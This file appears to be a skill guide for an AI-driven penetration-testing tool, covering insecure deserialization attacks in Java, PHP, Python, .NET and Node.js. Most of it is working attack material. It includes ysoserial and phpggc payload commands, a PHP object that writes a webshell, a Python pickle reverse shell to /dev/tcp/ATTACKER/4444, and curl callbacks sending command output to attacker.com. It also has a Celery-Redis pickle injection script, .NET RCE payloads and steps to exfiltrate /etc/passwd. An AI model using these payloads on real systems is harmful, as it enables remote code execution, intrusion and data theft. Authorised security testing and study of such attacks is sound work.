<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: deserialization
description: Insecure deserialization attacks covering Java gadget chains, PHP object injection, Python pickle, .NET, and Node.js
---

# Insecure Deserialization

Deserialization converts stored/transmitted data back into objects. When user-controlled data is deserialized without validation, attackers can supply malicious object graphs that trigger arbitrary code execution during the deserialization process itself.

## Attack Surface

**Where Serialized Data Appears**
- HTTP cookies (Base64-encoded Java serialized objects, PHP sessions)
- JSON/XML body fields typed as `object`, `data`, `payload`, `state`
- Hidden form fields with Base64 blobs
- JWT custom claims with embedded objects
- Message queues (RabbitMQ, Kafka, ActiveMQ) consuming untrusted messages
- Cache layers (Redis, Memcached) storing deserialized application state
- API endpoints accepting `Content-Type: application/x-java-serialized-object`
- RMI/JMX endpoints (Java)
- `__wakeup` / `__destruct` PHP magic methods triggered on session restore
- Python pickle in ML model serving, job queues (Celery), session backends

## Detection — Identifying Serialized Data

| Format | Magic Bytes / Pattern | Language |
|--------|----------------------|----------|
| Java serialized | `AC ED 00 05` (hex) / `rO0AB` (Base64) | Java |
| PHP serialized | `O:4:"User":1:{...}` / `a:2:{...}` | PHP |
| Python pickle | `\x80\x04` or `\x80\x02` (protocol 4/2) / `cos\nsystem\n` | Python |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF` | .NET |
| .NET JSON.NET | `"$type":"SomeAssembly.Class"` in JSON | .NET |
| Ruby Marshal | `\x04\x08` | Ruby |
| Node.js serialize | `{"rce":"_$$ND_FUNC$$_function()..."}` | Node.js |
| YAML | `!!python/object/apply:os.system` | Python/Ruby |

```bash
# Quick check — decode cookie and look for magic bytes
echo "rO0AB..." | base64 -d | xxd | head -2
# AC ED 00 05 → Java serialized object confirmed
```

## Java Deserialization

### Gadget Chains

Java deserialization triggers `readObject()` on deserialized classes. Exploit chains use existing library classes ("gadgets") to reach `Runtime.exec()`.

**Common Gadget Libraries (ysoserial)**
- `CommonsCollections1-7` — Apache Commons Collections (widely used)
- `Spring1`, `Spring2` — Spring Framework
- `Hibernate1`, `Hibernate2` — Hibernate ORM
- `Groovy1` — Groovy scripting
- `BeanShell1` — BeanShell scripting engine
- `ROME` — RSS/Atom parsing library
- `JRMPClient` — Java RMI deserialization trigger

### ysoserial Tool

```bash
# Generate payload (CommonsCollections1 + command)
java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0

# Generate and send directly
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(id)' | base64 -w0 | python3 -c "
import sys, urllib.parse
data = sys.stdin.read().strip()
print(urllib.parse.quote(data))
"

# Test all gadget chains automatically
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6 Spring1 Spring2 Groovy1; do
    echo "[*] Testing $chain"
    java -jar ysoserial.jar $chain 'curl http://COLLAB.com/?c='$chain 2>/dev/null | base64 -w0 > /tmp/payload_$chain.b64
done
```

### HTTP Endpoint Detection

```bash
# Send Java serialized object to endpoint
curl -X POST https://target.com/api/deserialize \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin

# Base64 encoded in JSON body
payload=$(java -jar ysoserial.jar CommonsCollections6 'curl http://COLLAB.com/cc6' | base64 -w0)
curl -X POST https://target.com/api/load \
  -H "Content-Type: application/json" \
  -d "{\"data\":\"$payload\"}"
```

### JMX / RMI Exploitation

```bash
# Scan for open RMI/JMX ports
nmap -sV -p 1099,4444,8686 target.com

# Exploit via ysoserial JRMP
java -cp ysoserial.jar ysoserial.exploit.JRMPClient target.com 1099 CommonsCollections6 'id'

# Using beanshooter
java -jar beanshooter.jar enum target.com 1099
java -jar beanshooter.jar tonka deploy target.com 1099 --stager-url http://attacker.com/
```

### Detection via Error Analysis

```bash
# Malformed serialized object → Java stack trace reveals gadget classes
python3 -c "import base64; print(base64.b64encode(b'AC\xed\x00\x05garbage').decode())"
# Submit to endpoint and look for ClassNotFoundException, NoSuchMethodError
# These reveal which libraries are present
```

## PHP Object Injection

PHP deserializes objects via `unserialize()`. Magic methods (`__wakeup`, `__destruct`, `__toString`, `__call`) execute automatically on deserialization.

### Magic Methods Abuse

```php
# __destruct — executes when object is garbage collected
class FileDelete {
    public $file;
    function __destruct() { unlink($this->file); }
}
# Inject: O:10:"FileDelete":1:{s:4:"file";s:20:"/var/www/config.php";}

# __wakeup — executes on unserialize
class Logger {
    public $logfile;
    public $data;
    function __wakeup() { file_put_contents($this->logfile, $this->data); }
}
# Write webshell: O:6:"Logger":2:{s:7:"logfile";s:28:"/var/www/html/shell.php";s:4:"data";s:28:"<?php system($_GET['c']); ?>";}
```

### PHP Gadget Chains (phpggc)

```bash
# List available chains for a framework
phpggc -l
phpggc -l | grep Laravel
phpggc -l | grep Symfony

# Generate Laravel RCE chain
phpggc Laravel/RCE1 system id
phpggc Laravel/RCE5 'system' 'id' --base64
phpggc Symfony/RCE4 exec 'curl http://attacker.com/$(id)' -b

# Generate and URL-encode
phpggc Laravel/RCE7 system id -u

# Test all available chains
phpggc -l | awk '{print $1}' | while read chain; do
    phpggc $chain system id 2>/dev/null && echo "[$chain] works"
done
```

### PHP Session Deserialization

```bash
# PHP sessions use serialize() by default
# PHPSESSID cookie → /tmp/sess_XXXX file → unserialize() on load
# Inject malicious object via registration/profile fields stored in session

# Example: user-controlled session data
# POST /login with username=O:8:"UserPref":1:{s:7:"command";s:2:"id";}
```

## Python Pickle

Python's `pickle` module executes arbitrary code during deserialization via `__reduce__`.

### Basic Pickle RCE

```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/$(id)',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

### Reverse Shell via Pickle

```python
import pickle, base64

class Shell:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
        return (__import__('os').system, (cmd,))

print(base64.b64encode(pickle.dumps(Shell())).decode())
```

### Common Targets

```bash
# Celery task queues — Redis/RabbitMQ backend with pickle
# Flask sessions (if SECRET_KEY known) using itsdangerous with pickle
# MLflow model serving — pickle-based model loading
# Scikit-learn models served via API
# Python job schedulers (APScheduler, RQ)

# Celery RCE via pickle in Redis backend
python3 -c "
import pickle, redis, base64
class Exploit:
    def __reduce__(self):
        return (eval, ('__import__(\"os\").popen(\"id\").read()',))
r = redis.Redis('target.com', 6379)
r.lpush('celery', pickle.dumps(Exploit()))
"
```

### PyYAML Deserialization

```python
# YAML with !!python/object tags
yaml_payload = "!!python/object/apply:os.system ['id']"
# Or more complex
yaml_payload = """
!!python/object/new:subprocess.Popen
args: [['id']]
kwds: {shell: true}
"""
```

## .NET Deserialization

### BinaryFormatter

```bash
# Generate with ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "cmd /c whoami"
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateDisableTypeCheck -o base64 -c "cmd /c whoami"

# ObjectStateFormatter (ViewState)
ysoserial.exe -f ObjectStateFormatter -g TypeConfuseDelegate -o base64 -c "cmd /c whoami"
```

### ViewState (.NET WebForms)

```bash
# Forge malicious ViewState if MAC validation disabled or key known
# Check: __VIEWSTATEMAC hidden field, X-ViewState-Validation-Key header

# Using ysoserial.net for ViewState
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami > c:\inetpub\wwwroot\out.txt" --generator=BEEFBEEF --viewstateuserkey=KEY --islegacy

# Detect MAC disabled: send modified ViewState, look for no error vs MAC error
```

### JSON.NET TypeNameHandling

```json
# When TypeNameHandling is All or Objects, inject $type
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd.exe",
      "Arguments": "/c whoami > c:\\output.txt"
    }
  }
}
```

## Node.js Deserialization

### node-serialize Package

```javascript
// Payload for node-serialize (IIFE in _$$ND_FUNC$$_)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}

// Base64 encode and inject into cookie
const payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'curl http://attacker.com/\'+require(\'os\').hostname())}()"}';
Buffer.from(payload).toString('base64')
```

### cryo / marshal npm packages

```javascript
// Similar IIFE-based payloads work for other serialize/deserialize packages
// Check package.json for: serialize, marshal, cryo, node-serialize, funcster
```

## Testing Methodology

1. **Identify serialized data** — check all cookies, body params, headers for magic bytes
2. **Decode and inspect** — `base64 -d | xxd` to confirm format
3. **Determine language/framework** — error messages, headers, file extensions
4. **Select gadget tool** — ysoserial (Java), phpggc (PHP), custom pickle (Python)
5. **Generate DNS callback payload** — confirm deserialization without needing RCE first
6. **Escalate to RCE** — try multiple gadget chains, observe Collaborator/interactsh callbacks
7. **Execute and exfiltrate** — `id`, `whoami`, `/etc/passwd`, env vars, cloud metadata

```bash
# Step 1: Detect Java serialized cookie
echo $COOKIE | base64 -d | xxd | head -1
# Expected: 0000000: aced 0005 ...

# Step 2: Generate DNS callback payload to confirm
java -jar ysoserial.jar CommonsCollections6 'nslookup UNIQUE.attacker.com' | base64 -w0

# Step 3: Try RCE if callback received
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(id)' | base64 -w0
```

## Blind Deserialization (No Output)

```bash
# Use OOB channels to confirm RCE
# 1. DNS callback
'nslookup $(id).COLLAB.burpcollaborator.net'
# 2. HTTP callback
'curl http://COLLAB.burpcollaborator.net/$(id|base64)'
# 3. Write file
'echo RCE > /tmp/rce_proof.txt'
# 4. Time-based (last resort)
'sleep 5'
```

## Validation

1. Achieve `id` command execution via OOB DNS/HTTP callback with output in domain label
2. Read `/etc/passwd` exfiltrated via HTTP GET
3. Write a proof file to web root if accessible
4. Demonstrate with exact serialized payload (reproducible)

## Impact

- Remote code execution as application user
- Container/VM escape if running privileged
- Cloud credential theft via metadata endpoint access
- Lateral movement to internal services via deserialized SSRF primitives

## Pro Tips

1. Always try DNS callback first — many environments block outbound HTTP but not DNS
2. Try all gadget chains — library versions vary, one chain may work while others fail
3. For Java: `SerializationDumper` reveals the object graph, helping identify available classes
4. PHP `__wakeup`/`__destruct` chains are often more reliable than complex gadget chains
5. Python pickle is always RCE — no gadget chains needed, `__reduce__` is universal
6. Check `robots.txt`, error pages, and job queue configurations for pickle/Java hints
7. Node.js `eval` in deserializers is the equivalent of pickle — any function call is RCE
8. For .NET ViewState: use `Padding Oracle` attacks to forge valid MACs without key

## Summary

Deserialization is language-specific but follows the same pattern: user-controlled binary/text data reconstructs server objects. Java requires gadget chains via ysoserial; PHP uses magic method chains via phpggc; Python pickle is always trivially exploitable. Always confirm with DNS callback before claiming RCE.
